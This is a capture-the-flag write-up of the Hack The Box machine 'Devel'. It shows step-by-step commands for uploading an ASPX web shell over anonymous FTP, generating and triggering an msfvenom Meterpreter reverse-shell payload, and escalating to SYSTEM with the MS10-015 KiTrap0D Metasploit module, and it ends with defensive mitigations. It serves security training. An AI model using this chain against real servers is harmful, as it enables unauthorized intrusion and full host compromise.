# Hack The Box - Devel

| Machine | OS | Difficulty |
|---------|----|------------|
| Devel | Windows | Easy |

---

# Overview

Devel is a beginner-friendly Windows machine that demonstrates the dangers of insecure file upload mechanisms. The target exposes an FTP service with anonymous authentication enabled, allowing arbitrary file uploads into the IIS web root. By uploading an ASPX web shell, remote command execution is obtained. A Meterpreter payload is then uploaded to gain a stable shell, followed by privilege escalation using the MS10-015 KiTrap0D vulnerability to obtain SYSTEM privileges.

---

# Enumeration

## Nmap Scan

A service scan reveals only two accessible services.

```bash
nmap -sC -sV -oN nmap_scan 10.129.242.143
```

### Result

```
21/tcp open  ftp
80/tcp open  http
```

### Service Details

| Port | Service | Version |
|------|----------|----------|
|21|FTP|Microsoft ftpd|
|80|HTTP|Microsoft IIS 7.5|

Notable observations:

- Anonymous FTP login is enabled.
- IIS 7.5 is hosting the web application.
- TRACE method is enabled.

---

## Anonymous FTP Enumeration

Connect to the FTP service.

```bash
ftp 10.129.242.143
```

Login anonymously.

```
Username: anonymous
Password:
```

Login succeeds immediately.

List the contents.

```text
ftp> ls
```

Output:

```
aspnet_client/
iisstart.htm
welcome.png
```

The FTP server appears to expose the IIS web root, making it an ideal target for uploading ASP.NET files.

---

# Web Enumeration

Browse to the web server.

```
http://10.129.242.143
```

The default IIS7 landing page is displayed.

Since IIS is serving the same files observed through FTP, anything uploaded through FTP should become directly accessible via HTTP.

This strongly suggests a writable web root.

---

# Initial Access

## Using an ASPX Command Shell

Kali already provides a lightweight ASP.NET command execution web shell.

Location:

```bash
cd /usr/share/webshells/aspx
```

Files available include:

```
cmdasp.aspx
```

Copy the shell into the working directory.

```bash
cp /usr/share/webshells/aspx/cmdasp.aspx .
```

---

## Upload the Web Shell

Reconnect to FTP.

```bash
ftp 10.129.242.143
```

Upload the shell.

```text
put cmdasp.aspx
```

Verify the upload.

```
ftp> ls

aspnet_client/
cmdasp.aspx
iisstart.htm
welcome.png
```

The upload completes successfully.

---

## Remote Command Execution

Open the uploaded shell.

```
http://10.129.242.143/cmdasp.aspx
```

The page provides a simple interface capable of executing arbitrary Windows commands.

Example:

```
dir
```

The response displays the contents of:

```
C:\Windows\System32\inetsrv
```

Further enumeration confirms command execution on the target.

Examples:

```
dir C:\

dir C:\Users

dir C:\inetpub

dir C:\inetpub\wwwroot
```

Attempts to access:

```
C:\Users\Administrator
```

or

```
C:\Users\babis
```

return **Access Denied**, indicating that the current IIS worker process is running with limited privileges.

---

# Obtaining a Stable Shell

While the command shell is useful for enumeration, it is cumbersome for post-exploitation. A Meterpreter session provides a far more reliable and feature-rich environment.

Generate an ASPX Meterpreter payload.

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
LHOST=10.10.14.160 \
LPORT=8888 \
-f aspx \
> devel.aspx
```

Configure a Metasploit listener.

```text
use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 8888

run
```

Upload the generated payload through FTP.

```text
put devel.aspx
```

The upload succeeds successfully.

Trigger the payload by visiting:

```
http://10.129.242.143/devel.aspx
```

Metasploit receives a reverse connection.

```
Meterpreter session 1 opened
```

A stable Meterpreter shell is now established, providing a solid foothold for local enumeration and privilege escalation.

# Local Enumeration

After obtaining a Meterpreter session, migrate to an interactive shell for host enumeration.

```text
meterpreter > shell
```

Enumerate the current user.

```cmd
whoami
```

The shell is running as the IIS application pool user.

```
iis apppool\web
```

Further inspection of the web root confirms the uploaded files.

```cmd
cd C:\inetpub\wwwroot

dir
```

Output:

```
aspnet_client
cmdasp.aspx
devel.aspx
iisstart.htm
welcome.png
```

At this stage, arbitrary command execution has been achieved, but administrative privileges are still unavailable.

---

# Privilege Escalation Enumeration

To identify suitable local privilege escalation vectors, background the Meterpreter session.

```text
meterpreter > background
```

Use Metasploit's Local Exploit Suggester.

```text
use post/multi/recon/local_exploit_suggester

set SESSION 2

run
```

The module reports several potential exploits, including:

```
exploit/windows/local/ms10_015_kitrap0d
exploit/windows/local/ms13_053_schlamperei
exploit/windows/local/ms13_081_track_popup_menu
...
```

Among these, **MS10-015 (KiTrap0D)** is applicable to the target operating system and provides a straightforward route to SYSTEM privileges.

---

# Privilege Escalation

## MS10-015 (KiTrap0D)

Load the exploit module.

```text
use exploit/windows/local/ms10_015_kitrap0d
```

Specify the active Meterpreter session.

```text
set SESSION 2
```

Configure the reverse payload.

```text
set LHOST tun0

set LPORT 4444
```

Run the exploit.

```text
run
```

After successful execution, Metasploit establishes a new privileged Meterpreter session.

```
Meterpreter session 3 opened
```

Verify the current security context.

```text
meterpreter > getuid
```

Output:

```
NT AUTHORITY\SYSTEM
```

The privilege escalation is now complete.

---

# Capturing the User Flag

Navigate to the standard user profile.

```cmd
cd C:\Users\babis\Desktop

dir
```

The directory contains:

```
user.txt
```

Display the flag.

```cmd
type user.txt
```

The user flag is successfully captured.

---

# Capturing the Root Flag

Navigate to the Administrator desktop.

```cmd
cd C:\Users\Administrator\Desktop

dir
```

The directory contains:

```
root.txt
```

Display the contents.

```cmd
type root.txt
```

The root flag is successfully obtained.

---

# Lessons Learned

## Attacker Perspective

- Enumerate every exposed service before attempting exploitation.
- Anonymous FTP access should immediately raise suspicion, especially when paired with IIS.
- Writable web roots frequently allow arbitrary code execution through web shell uploads.
- A simple command shell is sufficient to bootstrap a more stable Meterpreter session.
- Automated enumeration tools such as `local_exploit_suggester` significantly reduce time spent identifying privilege escalation opportunities.
- Always verify exploit compatibility with the target operating system before execution.

---

## Defender Perspective

- Disable anonymous FTP authentication unless it is explicitly required.
- Separate FTP upload directories from the web server document root.
- Prevent execution of uploaded ASPX files in writable directories.
- Restrict write permissions for IIS application pools.
- Apply Microsoft security updates to eliminate publicly known privilege escalation vulnerabilities such as MS10-015.
- Monitor IIS logs for suspicious uploads and execution of newly created ASPX files.
- Enable endpoint detection to identify web shell activity and post-exploitation behavior.

---

# Mitigations

| Vulnerability | Mitigation |
|---------------|------------|
| Anonymous FTP Login | Disable anonymous authentication and require strong credentials. |
| Writable Web Root | Store uploaded files outside the web root and validate file types. |
| Arbitrary ASPX Execution | Prevent execution permissions on upload directories and enforce application whitelisting. |
| Outdated Windows Kernel | Apply Microsoft security patches, including fixes for MS10-015. |
| Weak Post-Exploitation Detection | Monitor IIS logs, PowerShell activity, and unusual process creation from `w3wp.exe`. |

---

# Conclusion

Devel is an excellent introductory Windows machine that demonstrates how multiple low-severity misconfigurations can combine into complete system compromise. Anonymous FTP access exposed a writable IIS web root, enabling the upload of an ASPX web shell and remote command execution. This foothold was upgraded to a Meterpreter session, after which local enumeration identified the **MS10-015 (KiTrap0D)** vulnerability. Exploiting this flaw resulted in **NT AUTHORITY\SYSTEM** privileges and full control of the host.

The machine reinforces several key penetration testing concepts, including service enumeration, web shell deployment, Windows post-exploitation, and local privilege escalation through vulnerable kernel components.
